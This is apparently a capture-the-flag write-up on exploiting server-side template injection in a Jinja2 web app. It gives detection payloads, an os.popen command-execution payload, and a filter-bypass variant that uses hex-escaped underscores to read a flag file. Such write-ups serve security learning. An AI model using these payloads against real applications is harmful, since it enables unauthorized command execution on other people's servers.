> Upon arriving at the landing page, we see that there's a web app which outputs user input to the resulting webpage, which is a classic SSTI scenario. We try this payload to figure out if the app is vulnerable to SSTI
```
{{7 * 7}}
```
> This shows us that the app is vulnerable to SSTI. Next, we need to confirm which templating engine is being used, with the following payload
```
{{7 * '7'}}
```
> This confirms that the templating engine being used is Jinja2. We can use the following payload to run a system command using SSTI
```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
> We see that the app is filtering on some part of the command, so we give this command to bypass special characters
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
> This payload works, and we see that there's a flag file in this directory, so we use this payload to read it
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
Finis
